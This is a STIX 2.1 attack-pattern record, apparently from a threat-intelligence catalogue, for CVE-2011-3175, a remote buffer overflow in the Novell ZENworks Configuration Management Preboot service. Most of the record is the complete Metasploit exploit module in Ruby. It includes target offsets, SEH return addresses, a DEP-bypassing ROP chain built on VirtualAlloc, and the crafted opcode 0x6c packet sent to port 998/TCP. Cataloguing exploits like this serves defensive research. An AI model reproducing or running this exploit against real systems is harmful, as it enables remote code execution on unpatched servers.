{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59cf5d86-f77d-4bc3-8e52-79e076fd84e5",
    "created": "2024-08-14T16:38:55.697455Z",
    "modified": "2024-08-14T16:38:55.69746Z",
    "name": "Novell ZENworks Configuration Management Preboot Service 0x6c Buffer Overflow",
    "description": " This module exploits a remote buffer overflow in the ZENworks Configuration Management. The vulnerability exists in the Preboot service and can be triggered by sending a specially crafted packet with the opcode 0x6c (PROXY_CMD_GET_NEXT_STEP) to port 998/TCP. The module has been successfully tested on Novell ZENworks Configuration Management 10 SP2 / SP3 and Windows Server 2003 SP2 (DEP bypass).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/novell/zenworks_preboot_op6c_bof.rb",
            "external_id": "zenworks_preboot_op6c_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3175"
        },
        {
            "source_name": "reference",
            "url": "http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=973"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell ZENworks Configuration Management Preboot Service 0x6c Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a remote buffer overflow in the ZENworks Configuration\n        Management. The vulnerability exists in the Preboot service and can be triggered by\n        sending a specially crafted packet with the opcode 0x6c (PROXY_CMD_GET_NEXT_STEP)\n        to port 998/TCP. The module has been successfully tested on Novell ZENworks\n        Configuration Management 10 SP2 / SP3 and Windows Server 2003 SP2 (DEP bypass).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-3175' ],\n          [ 'OSVDB', '80231' ],\n          [ 'BID', '52659' ],\n          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=973' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n          'Space'=> 990,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xC4\\x54\\xF2\\xFF\\xFF\" # add esp, -3500\n        },\n      'Platform'       => ['win'],\n      'Targets'        =>\n        [\n          [ 'Novell ZENworks Configuration Management 10 SP3 / Windows 2003 SP2',\n            {\n              'Offset'            => 1100,\n              'OffsetBottomStack' => 1148,\n              'OffsetRop'         => 4,\n              'Ret'               => 0x10024b8c # add esp, 1204 # ret from zenimgweb.dll\n            }\n          ],\n          [ 'Novell ZENworks Configuration Management 10 SP2 / Windows 2003 SP2',\n            {\n              'Offset'            => 1100,\n              'OffsetBottomStack' => 1148,\n              'OffsetRop'         => 4,\n              'Ret'               => 0x10024a7c # add esp, 1204 # ret from zenimgweb.dll\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-02-22',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(998)])\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  # rop chain generated with mona.py\n  def create_rop_chain()\n\n\n    if target.name =~ /Novell ZENworks Configuration Management 10 SP3/\n      rop_gadgets =\n        [\n          0x100066b1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll]\n          0x00001000, # 0x00001000-> edx\n          0x100239df, # POP ECX # RETN [zenimgweb.dll]\n          0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll]\n          0x10018653, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll]\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          0x1002a38f, # PUSH EAX # POP ESI # RETN [zenimgweb.dll]\n          0x00423ddd, # POP EBP # RETN [novell-pbserv.exe]\n          0x10007b22, # & push esp #  ret  [zenimgweb.dll]\n          0x100235dc, # POP EBX # RETN [zenimgweb.dll]\n          0x00000001, # 0x00000001-> ebx\n          0x0041961a, # POP ECX # RETN [novell-pbserv.exe]\n          0x00000040, # 0x00000040-> ecx\n          0x1004702b, # POP EDI # RETN [zenimgweb.dll]\n          0x1001d001, # RETN (ROP NOP) [zenimgweb.dll]\n          0x10011217, # POP EAX # RETN [zenimgweb.dll]\n          nop,\n          0x10018ec8, # PUSHAD # RETN [zenimgweb.dll]\n        ].pack(\"V*\")\n    else # Novell ZENworks Configuration Management 10 SP2\n      rop_gadgets =\n        [\n          0x100065d1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll]\n          0x00001000, # 0x00001000-> edx\n          0x10062113, # POP ECX # RETN [zenimgweb.dll]\n          0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll]\n          0x10018553, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll]\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          junk,       # Filler (compensate)\n          0x10016818, # PUSH EAX # POP ESI # RETN [zenimgweb.dll]\n          0x1002fd05, # POP EBP # RETN [zenimgweb.dll]\n          0x10043053, # & push esp #  ret  [zenimgweb.dll]\n          0x1003cbf8, # POP EBX # RETN [zenimgweb.dll]\n          0x00000001, # 0x00000001-> ebx\n          0x00423eeb, # POP ECX # RETN [novell-pbserv.exe]\n          0x00000040, # 0x00000040-> ecx\n          0x1003173e, # POP EDI # RETN [zenimgweb.dll]\n          0x10020801, # RETN (ROP NOP) [zenimgweb.dll]\n          0x00406b58, # POP EAX # RETN [novell-pbserv.exe]\n          nop,\n          0x1006d1e6, # PUSHAD # RETN [zenimgweb.dll]\n        ].pack(\"V*\")\n    end\n\n    return rop_gadgets\n  end\n\n\n  def exploit\n    connect\n\n    buf = rand_text(4)\n    buf2 = rand_text(4)\n    buf3 = rand_text(4)\n    buf4 = rand_text(4)\n\n    buf5 = rand_text(target['OffsetRop'])\n    buf5 << create_rop_chain\n    buf5 << payload.encoded\n    buf5 << rand_text(target['Offset'] - buf5.length)\n    buf5 << generate_seh_record(target.ret)\n    buf5 << rand_text(target['OffsetBottomStack'] - buf4.length)\n\n    my_buf = \"\"\n    buf5.unpack(\"C*\").each {|b|\n      my_buf << [b].pack(\"C\")\n      my_buf << rand_text(1)\n    }\n\n    packet =  [0x6c].pack(\"N\") # Opcode 0x6c\n    packet << [buf.length].pack(\"N\") # Length\n    packet << buf # Value\n    packet << [buf2.length].pack(\"N\") # Length\n    packet << buf2 # Value\n    packet << [buf3.length].pack(\"N\") # Length\n    packet << buf3 # Value\n    packet << [buf4.length].pack(\"N\") # Length\n    packet << buf4 # Value\n    packet << [my_buf.length].pack(\"N\") # Length\n    packet << my_buf # Value\n    sock.put(packet)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-02-22",
    "x_mitre_platforms": [
        "['win']"
    ]
}